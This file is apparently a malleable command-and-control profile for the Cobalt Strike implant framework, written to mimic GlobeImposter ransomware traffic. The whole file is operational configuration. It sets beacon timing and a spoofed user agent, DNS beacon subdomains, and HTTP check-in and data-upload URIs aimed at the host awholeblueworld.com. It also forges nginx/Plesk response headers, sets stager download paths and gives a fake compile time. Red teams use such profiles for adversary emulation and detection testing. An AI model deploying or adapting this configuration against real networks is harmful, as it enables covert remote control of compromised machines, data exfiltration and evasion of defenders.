#GlobeImposter ransomware
#taken from --> http://www.malware-traffic-analysis.net/2017/11/30/index.html
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla Firefox/4.0(compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0;SLC2; .NET CLD 3.5.30729; Media Center PC 6.0;)";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}


http-get {
    
    set uri "/JHGcd476334";
    
    client {

	header "Accept" "*/*";
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "awholeblueworld.com";
	header "Connection" "Keep-Alive";
	
        
        metadata {
            base64url;
	    header "Cookie";

        }


    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
        

        output {

            netbios;
	    prepend "500a ...............|T..?~.G..a.I H. AQ...J...";
            print;
        }
    }
}

http-post {
    set verb "GET";
    set uri "/count.php";

    client {

	header "Accept" "*/*";
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "awholeblueworld.com";
	header "Connection" "Keep-Alive";
        
        output {
            base64url;
	    parameter "nu";
	    


        }


        id {
            base64url;
	    parameter "fb";

        }

#	parameter "fb" "110";

    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
        
        
        output {
            netbios;
	    prepend "500a ...............|T..?~.G..a.I H. AQ...J...";
            print;
        }

    }
}

http-stager {

    set uri_x86 "/JHGCd476334";
    set uri_x64 "/JHGcD476334";


    client {

	header "Host" "awholeblueworld";
	header "Connection" "keep-alive";

    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
	

	output {
	   
            print;
	}
    
    }


}

stage {
	set userwx "true";
	set compile_time "03 Feb 2016 09:17:32";
	set image_size_x86 "448012";
	set image_size_x64 "448012";
	#set obfuscate "true";
}
